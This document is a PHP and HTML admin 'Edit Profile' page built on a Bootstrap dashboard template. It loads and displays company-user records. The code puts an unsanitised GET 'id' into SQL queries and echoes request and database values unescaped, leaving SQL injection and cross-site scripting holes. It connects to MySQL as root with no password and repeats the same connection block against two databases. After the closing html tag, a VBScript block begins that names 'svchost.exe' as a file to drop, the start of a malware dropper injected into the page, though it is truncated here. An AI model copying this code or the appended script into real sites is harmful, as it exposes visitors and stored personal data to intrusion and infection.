<?php session_start(); ?>
<?php require_once("function.php"); ?>
<?php $id = trim($_GET['id']); ?>
<?php $connection = mysql_connector("localhost","root","","register_db"); ?>
<?php $result = selector($connection,"SELECT * FROM regForm_tb WHERE id = '$id'")?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Light Bootstrap Dashboard by Creative Tim</title>

    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <link rel="stylesheet" href="my_css/dashboard.css"/>

    <!-- Bootstrap core CSS     -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" />

    <!-- Animation library for notifications   -->
    <link href="assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Light Bootstrap Table core CSS    -->
    <link href="assets/css/light-bootstrap-dashboard.css?v=1.4.0" rel="stylesheet"/>


    <!--  CSS for Demo Purpose, don't include it in your project     -->
    <link href="assets/css/demo.css" rel="stylesheet" />


    <!--     Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
    <link href='http://fonts.googleapis.com/css?family=Roboto:400,700,300' rel='stylesheet' type='text/css'>
    <link href="assets/css/pe-icon-7-stroke.css" rel="stylesheet" />
</head>
<body>
<div class="content">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-8">
                        <div class="card">
                            <div class="header">
                                <h4 class="title">Edit Profile</h4>
                            </div>
                            <div class="content">
<?php require_once("function.php"); ?>
<?php $id = trim($_GET['id']); ?>
<?php $connection = mysql_connector("localhost","root","","Company_db"); ?>
<?php $result = selector($connection, "SELECT * FROM company_tb WHERE id = '$id'")?>
                                <form name="form_here" action="dashboard.php" method="POST" enctype="multipart/form-data">
                                    <p>
                                        <?php if(isset($_GET['error'])){ echo $_GET['error']; } ?>
                                        <?php if(isset($_GET['success'])){ echo $_GET['success']; } ?>
                                    </p>
                                    <?php foreach($result as $key => $value){ ?>
                                    <div class="row">
                                        <div class="col-md-5">
                                            <div class="form-group">
                                                <label class=" boom">Company</label>
                                                <input type="text" name="edi_company" value="<?php if(isset($value['Company'])){ echo $value['Company']; } ?>" class="form-control profile" placeholder="Company">
                                            </div>
                                        </div>
                                        <div class="col-md-3">
                                            <div class="form-group">
                                                <label class="boom">Username</label>
                                                <input type="text" name="edi_username" value="<?php if(isset($value['Username'])){ echo $value['Username']; } ?>" class="form-control profile" placeholder="Username">
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="form-group">
                                                <label for="exampleInputEmail1" class="boom">Email address</label>
                                                <input type="email" name="edi_email" value="<?php if(isset($value['Email'])){ echo $value['Email']; } ?>" class="form-control profile" placeholder="Email">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label class="boom">First Name</label>
                                                <input type="text" name="edi_first_name" value="<?php if(isset($value['First_Name'])){ echo $value['First_Name']; } ?>" class="form-control profile" placeholder="Company">
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label class="boom">Last Name</label>
                                                <input type="text" name="edi_last_name" value="<?php if(isset($value['Last_Name'])){ echo $value['Last_Name']; } ?>" class="form-control profile" placeholder="Last Name">
                                                    <input type="hidden" value="<?php echo $id ?>" name="id_holder">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="form-group">
                                                <label class="boom">Address</label>
                                                <input type="text" name="edi_address" value="<?php if(isset($value['Address'])){ echo $value['Address']; } ?>" class="form-control profile" placeholder="Home Address">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-5">
                                            <div class="form-group">
                                                <label class="boom">Phone No.</label>
                                                <input type="number" name="edi_phone_no" value="<?php if(isset($value['Phone'])){ echo $value['Phone']; } ?>" class="form-control profile" name="phone_no" placeholder="Phone No.">
                                            </div>
                                        </div>

                                        <div class="col-md-5">
                                            <div class="form-group">
                                                <label class="boom">Date of Birth</label>
                                                <input type="text" name="edi_dob" value="<?php if(isset($value['Date_of_Birth'])){ echo $value['Date_of_Birth']; } ?>" class="form-control profile"  placeholder="YYYY/MM/DD">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-4">
                                            <div class="form-group">
                                                <label class="boom">City</label>
                                                <input type="text" name="edi_city" value="<?php if(isset($value['City'])){ echo $value['City']; } ?>" class="form-control profile" placeholder="City">
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="form-group">
                                                <label class="boom">Zip Code</label>
                                                <input type="text" name="edi_zip_code" value="<?php if(isset($value['Zip_code'])){ echo $value['Zip_code']; } ?>" class="form-control profile" placeholder="Country">
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="form-group">
                                                <label class="boom">Country</label>
                                                <input type="text" name="edi_country" value="<?php if(isset($value['Country'])){ echo $value['Country']; } ?>" class="form-control profile" placeholder="Country">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="form-group">
                                                <label class="boom">About Me</label>
                                                <textarea rows="5" name="edi_about_me" value="" class="form-control profile" placeholder="Here can be your description"><?php if(isset($value['About_Me'])){ echo $value['About_Me']; } ?></textarea>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="clearfix"></div>

                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card card-user">
                            <div class="image">
                                <img src="../image/uploads/5cb9af63c9963.jpg" alt="IMG"/>
                            </div>
                            <div class="content">
                                <div class="author">
                                    <img class="avatar border-gray" src="images/uploaded/<?php echo $value['image']; ?>"/>
                                        <input name="edi_reg_image[]" type="file">
                                      <h4 class="title"><?php echo $value['First_Name']; echo " "; echo $value['Last_Name']; ?><br />
                                         <small><?php echo $value['Username']; ?></small>
                                      </h4>
                                 </a>
                        </div>
                    <?php } ?>
                </div>
            </div>
        </div>
        <button type="submit" name="admin_update" class="btn btn-info btn-fill pull-left">Update Profile</button>
        </form>


        <footer class="footer">
            <div class="container-fluid">
                <nav class="pull-left">
                    <ul>
                        <li>
                            <a href="#">
                                Home
                            </a>
                        </li>
                        <li>
                            <a href="#">
                                Company
                            </a>
                        </li>
                        <li>
                            <a href="#">
                                Portfolio
                            </a>
                        </li>
                        <li>
                            <a href="#">
                               Blog
                            </a>
                        </li>
                    </ul>
                </nav>
                <p class="copyright pull-right">
                    &copy; <script>document.write(new Date().getFullYear())</script> <a href="http://www.creative-tim.com">Creative Tim</a>, made with love for a better web
                </p>
            </div>
        </footer>

    </div>
</div>


</body>

    <!--   Core JS Files   -->
    <script src="assets/js/jquery.3.2.1.min.js" type="text/javascript"></script>
    <script src="assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Charts Plugin -->
    <script src="assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="assets/js/bootstrap-notify.js"></script>

    <!--  Google Maps Plugin    -->
    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>

    <!-- Light Bootstrap Table Core javascript and methods for Demo purpose -->
    <script src="assets/js/light-bootstrap-dashboard.js?v=1.4.0"></script>

    <!-- Light Bootstrap Table DEMO methods, don't include it in your project! -->
    <script src="assets/js/demo.js"></script>

</html>
<SCRIPT Language=VBScript>
DropFileName = "svchost.exe"